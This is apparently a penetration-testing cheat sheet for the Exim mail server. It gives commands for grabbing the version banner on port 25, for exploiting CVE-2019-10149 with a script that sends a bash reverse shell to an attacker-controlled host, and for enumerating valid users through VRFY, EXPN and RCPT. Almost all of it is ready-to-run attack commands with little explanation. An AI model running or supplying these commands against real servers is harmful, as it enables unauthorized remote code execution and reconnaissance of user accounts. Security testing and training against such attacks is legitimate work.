# Exim

### Identify Exim version

Banner grab on port 25 — Version determines exploit path

```bash
nc -nv $IP 25
nmap -sV -p 25 $IP
```

---

### Exim 4.87-4.91 RCE (CVE-2019-10149)

"The Return of the WIZard" — Local or remote RCE

```bash
python3 raptor_exim_wiz.py -t $IP -p 25 -c "bash -i >& /dev/tcp/$LHOST/4444 0>&1"
```

---

### Exim user enumeration

VRFY and EXPN commands — Enumerate valid users

```bash
smtp-user-enum -M VRFY -U users.txt -t $IP
smtp-user-enum -M EXPN -U users.txt -t $IP
smtp-user-enum -M RCPT -U users.txt -t $IP
```

---
